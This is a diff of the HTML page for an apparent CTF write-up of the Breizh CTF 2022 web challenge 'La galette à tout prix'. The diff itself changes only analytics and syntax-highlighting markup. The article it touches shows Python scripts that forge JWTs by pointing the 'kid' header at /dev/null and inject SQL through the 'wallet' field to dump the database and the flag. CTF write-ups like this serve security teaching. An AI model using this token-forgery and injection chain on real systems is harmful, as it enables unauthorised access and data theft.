@@ -3,23 +3,21 @@
   <head>
     <title>[Breizh CTF 2022 - web] La galette à tout prix // ret2school</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="nasm" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
 
     
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-8K5XT0SJN8', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
 }
 </script>
 
@@ -34,9 +32,10 @@ import jwt FILENAME = &quot;/dev/null&quot; key = open(FILENAME).read(32) jwt.en
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiciLCJ3YWxsZXQiOltdLCJraWQiOiIuL3NlY3JldC5rZXkifQ.sPF55gkdqUQqAfkeBFtQRWOZgh_4S2jaIEJz2FcUsp8 header : {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;} payload : {&quot;username&quot;:&quot;&#39;&quot;,&quot;wallet&quot;:[],&quot;kid&quot;:&quot;./secret.key&quot;} If we edit kid with a file that we already know the content (such as /dev/null) we can sign any JWT.
 import jwt FILENAME = &quot;/dev/null&quot; key = open(FILENAME).read(32) jwt.encode({&quot;username&quot;:&quot;Monsieur Rennes Whisky&quot;,&quot;wallet&quot;:[f&quot;2 union {sql}&quot;],&quot;kid&quot;:FILENAME}, key=key, algorithm=&quot;HS256&quot;) # it provides us a valid JWT :) We then discover that there is an SQL injection with wallet." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ret2school.github.io/post/galette/" />
+<meta property="og:url" content="https://ret2school.github.io/post/galette/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2022-04-05T00:00:00+00:00" />
 <meta property="article:modified_time" content="2022-04-05T00:00:00+00:00" />
+
 
 
   </head>
@@ -100,12 +99,12 @@ import jwt FILENAME = &quot;/dev/null&quot; key = open(FILENAME).read(32) jwt.en
     </header>
     <div class="post-content">
       <p>We are given a JWT. It contains a field <code>kid</code> which is the name of the file containing the key to sign the JWT :</p>
-<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiciLCJ3YWxsZXQiOltdLCJraWQiOiIuL3NlY3JldC5rZXkifQ.sPF55gkdqUQqAfkeBFtQRWOZgh_4S2jaIEJz2FcUsp8
+<pre tabindex="0"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiciLCJ3YWxsZXQiOltdLCJraWQiOiIuL3NlY3JldC5rZXkifQ.sPF55gkdqUQqAfkeBFtQRWOZgh_4S2jaIEJz2FcUsp8
 
 header : {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}
 payload : {&quot;username&quot;:&quot;'&quot;,&quot;wallet&quot;:[],&quot;kid&quot;:&quot;./secret.key&quot;}
 </code></pre><p>If we edit <code>kid</code> with a file that we already know the content (such as <code>/dev/null</code>) we can sign any JWT.</p>
-<pre><code>import jwt
+<pre tabindex="0"><code>import jwt
 
 FILENAME = &quot;/dev/null&quot;
 key = open(FILENAME).read(32)
@@ -114,7 +113,7 @@ jwt.encode({&quot;username&quot;:&quot;Monsieur Rennes Whisky&quot;,&quot;wallet
 
 # it provides us a valid JWT :)
 </code></pre><p>We then discover that there is an SQL injection with <code>wallet</code>. So let&rsquo;s dump the database.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#ff79c6">import</span> jwt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#ff79c6">import</span> jwt
 <span style="color:#ff79c6">import</span> requests
 <span style="color:#ff79c6">import</span> json
 
@@ -123,18 +122,18 @@ key <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:i
 
 sql <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;select sql,2 from sqlite_master&#34;</span>
 
-cookies <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;user&#34;</span>:jwt<span style="color:#ff79c6">.</span>encode({<span style="color:#f1fa8c">&#34;username&#34;</span>:<span style="color:#f1fa8c">&#34;Monsieur Rennes Whisky&#34;</span>,<span style="color:#f1fa8c">&#34;wallet&#34;</span>:[f<span style="color:#f1fa8c">&#34;2 union {sql}&#34;</span>],<span style="color:#f1fa8c">&#34;kid&#34;</span>:FILENAME}, key<span style="color:#ff79c6">=</span>key, algorithm<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;HS256&#34;</span>)}
-r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;https://la-galette-a-tout-prix.ctf.bzh:21000/wallet&#34;</span>, cookies<span style="color:#ff79c6">=</span>cookies, verify<span style="color:#ff79c6">=</span>False)
+cookies <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;user&#34;</span>:jwt<span style="color:#ff79c6">.</span>encode({<span style="color:#f1fa8c">&#34;username&#34;</span>:<span style="color:#f1fa8c">&#34;Monsieur Rennes Whisky&#34;</span>,<span style="color:#f1fa8c">&#34;wallet&#34;</span>:[<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;2 union </span><span style="color:#f1fa8c">{</span>sql<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>],<span style="color:#f1fa8c">&#34;kid&#34;</span>:FILENAME}, key<span style="color:#ff79c6">=</span>key, algorithm<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;HS256&#34;</span>)}
+r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;https://la-galette-a-tout-prix.ctf.bzh:21000/wallet&#34;</span>, cookies<span style="color:#ff79c6">=</span>cookies, verify<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
 <span style="color:#ff79c6">for</span> k,val <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">enumerate</span>(json<span style="color:#ff79c6">.</span>loads(r<span style="color:#ff79c6">.</span>text)):
-    <span style="color:#ff79c6">print</span>(k, val[<span style="color:#f1fa8c">&#34;name&#34;</span>])
+    <span style="color:#8be9fd;font-style:italic">print</span>(k, val[<span style="color:#f1fa8c">&#34;name&#34;</span>])
 </code></pre></div><p>Output :</p>
-<pre><code>0 CREATE TABLE galette(id integer primary key autoincrement, name text, description text)
+<pre tabindex="0"><code>0 CREATE TABLE galette(id integer primary key autoincrement, name text, description text)
 1 CREATE TABLE precommande(id integer primary key autoincrement, id_galette integer, personal_message text)
 2 CREATE TABLE sqlite_sequence(name,seq)
 3 CREATE TABLE users(id integer primary key autoincrement, username text, password text)
 </code></pre><p>The flag is in <code>precommande.presonnal_message</code>.
 Here is the full script :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#ff79c6">import</span> jwt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#ff79c6">import</span> jwt
 <span style="color:#ff79c6">import</span> requests
 <span style="color:#ff79c6">import</span> json
 
@@ -151,10 +150,10 @@ key <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:i
 
 sql <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;select personal_message,2 from precommande&#34;</span>
 
-cookies <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;user&#34;</span>:jwt<span style="color:#ff79c6">.</span>encode({<span style="color:#f1fa8c">&#34;username&#34;</span>:<span style="color:#f1fa8c">&#34;Monsieur Rennes Whisky&#34;</span>,<span style="color:#f1fa8c">&#34;wallet&#34;</span>:[f<span style="color:#f1fa8c">&#34;2 union {sql}&#34;</span>],<span style="color:#f1fa8c">&#34;kid&#34;</span>:FILENAME}, key<span style="color:#ff79c6">=</span>key, algorithm<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;HS256&#34;</span>)}
-r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;https://la-galette-a-tout-prix.ctf.bzh:21000/wallet&#34;</span>, cookies<span style="color:#ff79c6">=</span>cookies, verify<span style="color:#ff79c6">=</span>False)
+cookies <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;user&#34;</span>:jwt<span style="color:#ff79c6">.</span>encode({<span style="color:#f1fa8c">&#34;username&#34;</span>:<span style="color:#f1fa8c">&#34;Monsieur Rennes Whisky&#34;</span>,<span style="color:#f1fa8c">&#34;wallet&#34;</span>:[<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;2 union </span><span style="color:#f1fa8c">{</span>sql<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>],<span style="color:#f1fa8c">&#34;kid&#34;</span>:FILENAME}, key<span style="color:#ff79c6">=</span>key, algorithm<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;HS256&#34;</span>)}
+r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;https://la-galette-a-tout-prix.ctf.bzh:21000/wallet&#34;</span>, cookies<span style="color:#ff79c6">=</span>cookies, verify<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
 <span style="color:#ff79c6">for</span> k,val <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">enumerate</span>(json<span style="color:#ff79c6">.</span>loads(r<span style="color:#ff79c6">.</span>text)):
-    <span style="color:#ff79c6">print</span>(k, val[<span style="color:#f1fa8c">&#34;name&#34;</span>])
+    <span style="color:#8be9fd;font-style:italic">print</span>(k, val[<span style="color:#f1fa8c">&#34;name&#34;</span>])
 
 <span style="color:#6272a4"># BZHCTF{u_st34l_th1s_b34ut1ful_g4l3tt3_s4uc1ss3!!}</span>
 </code></pre></div>
